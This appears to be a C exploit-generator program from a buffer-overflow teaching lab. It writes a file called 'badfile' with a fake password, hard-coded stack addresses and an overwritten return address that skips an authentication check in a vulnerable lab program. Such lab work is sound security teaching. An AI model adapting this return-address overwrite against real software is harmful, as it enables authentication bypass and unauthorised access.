#include <stdlib.h>
#include <stdio.h>
#include <string.h>
void main(int argc, char **argv)
{
    char buffer[600];
    FILE *badfile;
    /* The address of the instruction immediate after the check in main() function. */
    char return_address[] = "\x08\x04\x08\xd8"; //Give the address here.
    /* Fill the entire buffer with 0x00. */
    memset(&buffer, 0x00, 600);
    /* You need to fill the buffer with appropriate data here. */
    char *p = buffer;
    memcpy(p, "12345678", 8);
    p += 8;
    memcpy(p, "secretxx", 8);
    p += 8;
    memcpy(p, "\x7f\xff\x75\xb8", 4);
    p += 4;
    memcpy(p, return_address, 4);
    p += 4;
    memcpy(p, "\x7f\xff\x75\xd8", 4);

    /* Save the content to the file "badfile". */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 600, 1, badfile);
    fclose(badfile);
}
